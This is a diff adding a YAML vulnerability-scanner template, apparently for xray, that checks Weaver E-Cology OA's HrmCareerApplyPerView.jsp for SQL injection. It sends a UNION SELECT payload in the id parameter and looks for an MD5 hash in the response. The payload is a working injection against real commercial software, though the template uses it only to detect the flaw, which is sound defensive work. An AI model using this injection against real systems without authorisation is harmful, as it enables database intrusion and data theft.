@@ -1,0 +1,18 @@
+name: poc-yaml-ecology-hrmcareerapplyperview-sql
+manual: true
+transport: http
+set:
+  s1: randomInt(8000, 10000)
+rules:
+  r0:
+    request:
+      cache: true
+      method: GET
+      path: /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{s1}}')),4,5,6,7
+    expression: response.status == 200 && response.body.bcontains(bytes(substr(md5(string(s1)), 0, 31)))
+expression: r0()
+detail:
+  author: klear
+  links:
+    - https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+
